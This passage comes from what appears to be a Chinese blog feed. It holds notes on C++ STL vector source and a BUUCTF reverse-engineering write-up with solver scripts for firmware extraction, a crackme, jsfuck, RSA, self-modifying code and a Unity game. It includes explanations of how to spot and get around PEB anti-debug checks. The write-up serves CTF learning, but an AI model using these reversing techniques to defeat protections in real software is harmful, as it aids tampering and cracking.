__x)</span><br><span class="line">&#123;</span><br><span class="line">    //若还有空间</span><br><span class="line">    if (this-&gt;_M_impl._M_finish != this-&gt;_M_impl._M_end_of_storage)</span><br><span class="line">&#123;</span><br><span class="line">    _Alloc_traits::construct(this-&gt;_M_impl, this-&gt;_M_impl._M_finish,</span><br><span class="line">                    _GLIBCXX_MOVE(*(this-&gt;_M_impl._M_finish</span><br><span class="line">                                - 1)));</span><br><span class="line">    ++this-&gt;_M_impl._M_finish;</span><br><span class="line">    _GLIBCXX_MOVE_BACKWARD3(__position.base(),</span><br><span class="line">                this-&gt;_M_impl._M_finish - 2,</span><br><span class="line">                this-&gt;_M_impl._M_finish - 1);</span><br><span class="line">    *__position = _Tp(std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">&#125;</span><br><span class="line">    else</span><br><span class="line">&#123;</span><br><span class="line">    const size_type __len =</span><br><span class="line">    _M_check_len(size_type(1), &quot;vector::_M_insert_aux&quot;); //新长度</span><br><span class="line">    const size_type __elems_before = __position - begin();</span><br><span class="line">    //临时新迭代器</span><br><span class="line">    pointer __new_start(this-&gt;_M_allocate(__len));</span><br><span class="line">    pointer __new_finish(__new_start);</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        //将添加的元素置入位置</span><br><span class="line">        _Alloc_traits::construct(this-&gt;_M_impl,</span><br><span class="line">                            __new_start + __elems_before,</span><br><span class="line">                    std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">        __new_finish = 0;</span><br><span class="line">        //原先前半部分的元素</span><br><span class="line">        __new_finish</span><br><span class="line">    = std::__uninitialized_move_if_noexcept_a</span><br><span class="line">    (this-&gt;_M_impl._M_start, __position.base(),</span><br><span class="line">        __new_start, _M_get_Tp_allocator());</span><br><span class="line"></span><br><span class="line">        ++__new_finish;</span><br><span class="line">        //原先后半部分的元素</span><br><span class="line">        __new_finish</span><br><span class="line">    = std::__uninitialized_move_if_noexcept_a</span><br><span class="line">    (__position.base(), this-&gt;_M_impl._M_finish,</span><br><span class="line">        __new_finish, _M_get_Tp_allocator());</span><br><span class="line">    &#125;</span><br><span class="line">        __catch(...)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!__new_finish)</span><br><span class="line">    _Alloc_traits::destroy(this-&gt;_M_impl,</span><br><span class="line">                            __new_start + __elems_before);</span><br><span class="line">        else</span><br><span class="line">    std::_Destroy(__new_start, __new_finish, _M_get_Tp_allocator());</span><br><span class="line">        _M_deallocate(__new_start, __len);</span><br><span class="line">        __throw_exception_again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //释放原vector，更新迭代器</span><br><span class="line">    std::_Destroy(this-&gt;_M_impl._M_start, this-&gt;_M_impl._M_finish,</span><br><span class="line">        _M_get_Tp_allocator());</span><br><span class="line">    _M_deallocate(this-&gt;_M_impl._M_start,</span><br><span class="line">        this-&gt;_M_impl._M_end_of_storage</span><br><span class="line">        - this-&gt;_M_impl._M_start);</span><br><span class="line">    this-&gt;_M_impl._M_start = __new_start;</span><br><span class="line">    this-&gt;_M_impl._M_finish = __new_finish;</span><br><span class="line">    this-&gt;_M_impl._M_end_of_storage = __new_start + __len;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vector&quot;&gt;&lt;a href=&quot;#vector&quot; class=&quot;headerlink&quot; title=&quot;vector&quot;&gt;&lt;/a&gt;vector&lt;/h1&gt;&lt;p&gt;主要代码位于 stl_vector.h&lt;br&gt;较为简单，本身就是个动态数组。结构较为简单&lt;br&gt;&lt;figur
      
    
    </summary>
    
      <category term="STL" scheme="http://siriuswhiter.tk/categories/stl/"/>
    
    
      <category term="c++" scheme="http://siriuswhiter.tk/tags/c/"/>
    
      <category term="STL" scheme="http://siriuswhiter.tk/tags/stl/"/>
    
  </entry>
  
  <entry>
    <title>c++ STL 源码分析(零)</title>
    <link href="http://siriuswhiter.tk/2020/03/13/c-stl-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E9%9B%B6/"/>
    <id>http://siriuswhiter.tk/2020/03/13/c-stl-源码分析-零/</id>
    <published>2020-03-13T05:49:30.000Z</published>
    <updated>2020-03-16T07:45:27.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><ul><li>后面发现好像按最初的vscode中的设置引用devc++中的include就有源码可以直接进行调试。且使用c++11的标准。</li></ul><p>首先下载源码：<a href="https://sourceforge.net/projects/stlport/" target="_blank" rel="noopener">https://sourceforge.net/projects/stlport/</a><br>为了简便起见，就不进行编译了</p><p>需要修改的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件：.\stlport\stl\config\user_config.h</span><br><span class="line">内容：#define _STLP_NO_IOSTREAMS 1</span><br><span class="line">方式：取消注释</span><br></pre></td></tr></table></figure><p>之后在编译器的头文件包含中将./stlport放在首位即可。<br>vscode中即修改c_cpp_properties.json中”configuration”下的”includePath”</p><h1 id="Base-amp-amp-Question"><a href="#Base-amp-amp-Question" class="headerlink" title="Base &amp;&amp; Question"></a>Base &amp;&amp; Question</h1><p>基本上所有的stl容器都有个allocator，用来为容器分配空间，因为较为复杂，所以决定最后再看。<br>然后会先从序列式容器入手（vector,prioirty_queue,list,deque,stack,queue），<br>然后是关联式容器(set,map，hashset,hashmap)。</p><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>关于c++ 11中的move 与forward，参考：<br><a href="https://www.cnblogs.com/Philip-Tell-Truth/p/6370019.html" target="_blank" rel="noopener">https://www.cnblogs.com/Philip-Tell-Truth/p/6370019.html</a><br><a href="https://www.cnblogs.com/catch/p/3507883.html" target="_blank" rel="noopener">https://www.cnblogs.com/catch/p/3507883.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Prepare&quot;&gt;&lt;a href=&quot;#Prepare&quot; class=&quot;headerlink&quot; title=&quot;Prepare&quot;&gt;&lt;/a&gt;Prepare&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;后面发现好像按最初的vscode中的设置引用devc++中的include就有源码可以直
      
    
    </summary>
    
      <category term="STL" scheme="http://siriuswhiter.tk/categories/stl/"/>
    
    
      <category term="c++" scheme="http://siriuswhiter.tk/tags/c/"/>
    
      <category term="STL" scheme="http://siriuswhiter.tk/tags/stl/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Re</title>
    <link href="http://siriuswhiter.tk/2020/02/05/buuctf-re/"/>
    <id>http://siriuswhiter.tk/2020/02/05/buuctf-re/</id>
    <published>2020-02-05T06:44:11.000Z</published>
    <updated>2020-02-20T09:10:17.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h1><p>一个关于路由器固件的逆向</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>UE打开看到文件开头的TP-LINK technologies等字样，应该是路由器相关的。binwalk查看bin文件，经过相关查询，发现最后的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2774624 bytes, 519 inodes, blocksize: 131072 bytes, created: 2015-04-13 09:35:04</span><br></pre></td></tr></table></figure></p><p>为一个文件系统，将其分离出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=firmware.bin skip=1180160 of=router-fs.squashfs bs=1</span><br></pre></td></tr></table></figure></p><p>file得到文件大小后，再加上大小分离<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=firmware.bin skip=1180160 of=fs.squashfs bs=1 count=2774624</span><br></pre></td></tr></table></figure></p><p>尝试使用unsquashfs解包，报错。查询相关问题，确认是版本不对，查询到相关解压缩工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su apt-get install build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line">cd firmware-mod-kit/src &amp;&amp; ./configure &amp;&amp; make</span><br></pre></td></tr></table></figure></p><p>之后使用unsquashfs_all.sh尝试解包得到squashfs_root，</p><p>原以为按题目提示是在/home/ctf/flag.txt中，但是又说了是后门网站及端口，<br>寻找到backor文件解upx在字符串中即可找到网站再通过交叉引用即可发现端口。</p><h1 id="crackME"><a href="#crackME" class="headerlink" title="crackME"></a>crackME</h1><p>有反调试手段的程序</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>需要输入用户名及密码来进行校验，用户名已知。<br>开始时根据用户名建了个表，在函数fn_401090处。<br>之后进行check。</p><p>先将输入的密码每两个字节转化为一个字节存储<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">while ( i &lt; strlen(pass) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( isdigit(pass[i]) )</span><br><span class="line">   &#123;</span><br><span class="line">     v9 = pass[i] - &apos;0&apos;;</span><br><span class="line">   &#125;</span><br><span class="line">   else if ( isxdigit(pass[i]) )               // a-f</span><br><span class="line">   &#123;</span><br><span class="line">     if ( *(_DWORD *)(*(_DWORD *)(__readfsdword(0x30u) + 24) + 12) != 2 ) //debug check</span><br><span class="line">       pass[i] = 0x22;</span><br><span class="line">     v9 = (pass[i] | 0x20) - 0x57;</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">     v9 = ((pass[i] | 0x20) - &apos;a&apos;) % 6 + 10;</span><br><span class="line">   &#125;</span><br><span class="line">   v10 = v9 + 0x10 * v10;                      // 每两个字节的输入转化为一个字节并将其存入V15中,eg:12abyz=&gt;[0x12,0xab,0xab]</span><br><span class="line">   if ( !((signed int)(i + 1) % 2) )</span><br><span class="line">   &#123;</span><br><span class="line">     v15[idx++] = v10;</span><br><span class="line">     len = idx;</span><br><span class="line">     v10 = 0;</span><br><span class="line">   &#125;</span><br><span class="line">   ++i;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>之后将其与用户名建的表异或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">while ( i_ &lt; 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 += user_rela[++j];</span><br><span class="line">    v13 = user_rela[j];</span><br><span class="line">    v8 = user_rela[v11];</span><br><span class="line">    user_rela[v11] = v13;</span><br><span class="line">    user_rela[j] = v8;</span><br><span class="line"></span><br><span class="line">    if ( *(_DWORD *)(__readfsdword(0x30u) + 0x68) &amp; 0x70 )// debug check</span><br><span class="line">      v13 = v11 + j;</span><br><span class="line">    *(&amp;v16 + i_) = user_rela[(unsigned __int8)(v8 + v13)] ^ v15[v5];</span><br><span class="line">    if ( *(_DWORD *)(__readfsdword(0x30u) + 2) &amp; 0xFF )// debug check</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 0xADu;</span><br><span class="line">      j = 0x2B;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401710((int)&amp;v16, (const char *)user, i_++);</span><br><span class="line">    v5 = i_;</span><br><span class="line">    if ( i_ &gt;= (unsigned int)(&amp;v15[strlen(v15) + 1] - &amp;v15[1]) )</span><br><span class="line">      v5 = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>最后检测得到的结果是否为’dbappsec’</p><p>调试写脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re = &apos;dbappsec&apos;</span><br><span class="line">li = [0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd]</span><br><span class="line"></span><br><span class="line">flag = [0 for _ in range(8)]</span><br><span class="line">for i in range(8):</span><br><span class="line">    flag[i] = hex(ord(re[i])^li[i]).replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class="line">pwd = &apos;&apos;.join(flag)</span><br><span class="line"></span><br><span class="line">import md5</span><br><span class="line">print md5.new(pwd).hexdigest()</span><br></pre></td></tr></table></figure></p><h2 id="反调试手段"><a href="#反调试手段" class="headerlink" title="反调试手段"></a>反调试手段</h2><p>该程序使用的均为PEB结构的检查，通过FS:[30h]处得到PEB结构的基址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  PVOID                         Reserved4[3];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[45];</span><br><span class="line">  BYTE                          Reserved10[96];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[128];</span><br><span class="line">  PVOID                         Reserved12[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure></p><ol><li><p>检测BeingDebugged</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B4D                 mov     eax, large fs:30h</span><br><span class="line">.text:00401B55                 mov     eax, [eax+2]</span><br><span class="line">.text:00401B5C                 test    eax, eax</span><br></pre></td></tr></table></figure></li><li><p>检测ProcessHeap属性<br>PEB结构的0X18处，被设置为加载器为进程分配的第一个堆的位置，第一个堆头有一个属性字段用来告诉这个堆是否在调试器中创建（ForceFlags和Flags）<br>在XP中ForceFlags位于堆头部偏移量0x10处，在win7他在0x44处<br>同理在XP中偏移量0x0C或者win7系统中偏离量0x40中查看Flags属性</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401985                 mov     eax, large fs:30h</span><br><span class="line">.text:0040198B                 mov     eax, [eax+18h]</span><br><span class="line">.text:0040198E                 mov     eax, [eax+0Ch]</span><br><span class="line">.text:00401991                 cmp     eax, 2</span><br></pre></td></tr></table></figure><ol start="3"><li>检测NTGlobalFlag</li></ol><p>PEB结构0x68处标志位，看是否为0x70<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401ADA                 mov     eax, large fs:30h </span><br><span class="line">.text:00401AE0                 mov     eax, [eax+68h]</span><br><span class="line">.text:00401AE3                 and     eax, 70h</span><br><span class="line">.text:00401AE6                 test    eax, eax</span><br></pre></td></tr></table></figure></p><h1 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h1><p>jsfuck相关</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>拿到脚本可以看到全是jsfuck来判断flag，看到里面有不少==判断，拿到在线解jsfuck的网站上对几个进行测试，可以确定是对flag中的值进行加减之后来校验，问题是太多了不可能一个个手动复制过去得到原等式。</p><p>查询看下别人的脚本，是将判断的那些先提取出到一个文件中，再对每一个’l[…]’(原先的…为正常的jsfuck的下标)，修改为”l[‘+(…)+’]”，相当于对所有jsfuck表示的数字用”‘+(…)+””给包括住</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;cstdio&gt;</span><br><span class="line">#include&lt;cstring&gt;</span><br><span class="line">#include&lt;cstdlib&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">typedef long long LL;</span><br><span class="line">#define foru(i,a,b) for(int i=a;i&lt;=b;i++)</span><br><span class="line">#define ford(i,a,b) for(int i=a;i&gt;=b;i--)</span><br><span class="line">char s[100000],a[100000];</span><br><span class="line">int cnt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    freopen(&quot;raw.js&quot;,&quot;r&quot;,stdin);</span><br><span class="line">    freopen(&quot;out.js&quot;,&quot;w&quot;,stut);</span><br><span class="line">    scanf(&quot;%s&quot;,s);</span><br><span class="line">    int n=strlen(s);</span><br><span class="line">    printf(&quot;s=&apos;%c&quot;,s[0]);</span><br><span class="line">    foru(i,1,n-1)&#123;</span><br><span class="line">        if(s[i]==&apos;[&apos;)</span><br><span class="line">            if(s[i-1]==&apos;l&apos;)&#123;</span><br><span class="line">                a[++cnt]=&apos;l&apos;;</span><br><span class="line">                printf(&quot;[&apos;+(&quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                a[++cnt]=&apos;[&apos;;</span><br><span class="line">                printf(&quot;[&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        else if(s[i]==&apos;]&apos;)&#123;</span><br><span class="line">            if(a[cnt]==&apos;l&apos;) printf(&quot;)+&apos;]&quot;);</span><br><span class="line">            else printf(&quot;]&quot;);</span><br><span class="line">            cnt--;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i-1]==&apos;=&apos;&amp;&amp;s[i-2]==&apos;=&apos;)printf(&quot;&apos;+(%c&quot;,s[i]);</span><br><span class="line">        else if(s[i+1]==&apos;&amp;&apos;&amp;&amp;s[i+2]==&apos;&amp;&apos;)printf(&quot;%c)+&apos;&quot;,s[i]);</span><br><span class="line">        else printf(&quot;%c&quot;,s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;);\nconsole.log(s);&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后将等式在浏览器控制台运行即可得到等式</p><p>将其复制出来加入z3的Solver，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">l = [Int(&apos;l[%d]&apos;%i) for i in range(0x2a)]</span><br><span class="line"></span><br><span class="line">s.add(...)</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">print s.model()</span><br></pre></td></tr></table></figure><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>RSA相关逆向？</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>可以直观的看到是个离散对数问题，反正是不可能硬解的。<br>然后是按rsa的思路来，模数是两个大素数的积，直接在factordb上分解得到pq，然后计算(p-1)*(q-1)</p><p>使用python计算的时候用下gmpy2库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libgmp-dev</span><br><span class="line">apt-get install libmpfr-dev</span><br><span class="line">apt-get install libmpc-dev</span><br><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure></p><p>写下解密脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">n = 103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">p = 282164587459512124844245113950593348271</span><br><span class="line">q = 366669102002966856876605669837014229419</span><br><span class="line"></span><br><span class="line">c= 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">phin = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">d= gmpy2.invert(e,phin)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">m = hex(m)[2:]</span><br><span class="line">print m</span><br><span class="line">for i in range(len(m)/2):</span><br><span class="line">    flag += chr(int(&apos;0x&apos;+m[2*i:2*(i+1)],16))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p><h1 id="GWCTF-2019-re3"><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019] re3"></a>[GWCTF 2019] re3</h1><p>SMC程序的逆向</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>输入之后判断长度，然后对402219为起始地址处开始每个字节异或0x99，之后运行该函数。<br>这里需要写个IDC脚本来帮忙<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">    auto addr = 0x402219; </span><br><span class="line">    auto i = 0;</span><br><span class="line">    for(i=0;i&lt;=223;i++)   </span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^0x99);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后f5将其转化为伪代码，发现内部函数不少，怀疑其为加密算法，后面发现有AES的S盒，推测为AES，找到生成的密钥<br>写个脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">k=&apos;cb8d493521b47a4cc1ae7e62229266ce&apos;.decode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">c=&apos;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&apos;.decode(&apos;hex&apos;)</span><br><span class="line">aes=AES.new(k)</span><br><span class="line">mess = aes.decrypt(c)</span><br><span class="line">print mess</span><br></pre></td></tr></table></figure></p><h1 id="maze-behind-junk"><a href="#maze-behind-junk" class="headerlink" title="maze_behind_junk"></a>maze_behind_junk</h1><p>又一道迷宫</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>查壳发现upx壳直接脱壳，之后可能因为中间掺杂了数据不能看伪代码，不过汇编也不长可以直接看</p><p>可以分析出来就是正常的迷宫switch，上下和左右分别控制两个变量，给了两张表，如果拿到里面是4的话就直接去最后的检查</p><p>分析出来是wasd控制上下左右，因为最后对两个变量进行检查，所以控制下次数就ok了，不过flag肯定不唯一，就不用交了</p><h1 id="BJD-hamburger-competition"><a href="#BJD-hamburger-competition" class="headerlink" title="BJD hamburger competition"></a>BJD hamburger competition</h1><p>unity 逆向</p><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>第一次碰到unity逆向，还是老八的小汉堡…，像是B站某个up做的…。看着程序挺正常。<br>使用dnspy逆向BJD hamburger competition_Data\Managed\Assembly-CSharp.dll,能够找到后门的关键函数（不太清楚是不是unity的关键函数都在这个dll里）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">string name = this.toSpawn.name;</span><br><span class="line">if (name == &quot;汉堡底&quot; &amp;&amp; Init.spawnCount == 0)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret += 997;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;鸭屁股&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret -= 127;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;胡罗贝&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret *= 3;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;臭豆腐&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret ^= 18;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;俘虏&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret += 29;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;白拆&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret -= 47;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;美汁汁&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret *= 5;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;柠檬&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret ^= 87;</span><br><span class="line">&#125;</span><br><span class="line">else if (name == &quot;汉堡顶&quot; &amp;&amp; Init.spawnCount == 5)</span><br><span class="line">&#123;</span><br><span class="line">Init.secret ^= 127;</span><br><span class="line">string str = Init.secret.ToString();</span><br><span class="line">if (ButtonSpawnFruit.Sha1(str) == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;)</span><br><span class="line">&#123;</span><br><span class="line">this.result = &quot;BJDCTF&#123;&quot; + ButtonSpawnFruit.Md5(str) + &quot;&#125;&quot;;</span><br><span class="line">Debug.Log(this.result);</span><br><span class="line">&#125;</span><br><span 